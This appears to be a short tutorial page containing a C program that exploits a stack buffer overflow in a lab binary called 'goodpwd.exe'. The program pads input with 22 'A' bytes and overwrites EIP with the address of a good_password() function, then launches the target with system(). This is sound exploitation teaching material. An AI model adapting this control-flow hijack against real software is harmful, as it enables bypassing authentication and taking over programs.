# Main Program Exploitation with C

{% code title="exploit.c" overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
  char command[256];  // this holds the .exe app to execute.
  char parameter[32]; // you can set any number here, ie 64, 128 e.t.c.
  
  memset(parameter, 0x41, 22); // fill the parameter with 'A' character
  
  // now modify the location which overwrites the EIP
  //  we need to jump to the good_password() function located at 0x00401548
  // i used mona to find the offset value ie, the EIP point at which the app breaks which is at 22.
  parameter[22] = 0x48;
  parameter[23] = 0x15;
  parameter[24] = 0x40;
  parameter[25] = 0x00;
  parameter[26] = 0x00; // null terminate the parameter so as previous frames are not overwritten
  
  strcpy(command, "goodpwd.exe ");
  strcat(command, parameter);
  
  printf("%s\n", command);
  
  system(command);  /* execute the command */
  
  return 0;
}
```
{% endcode %}
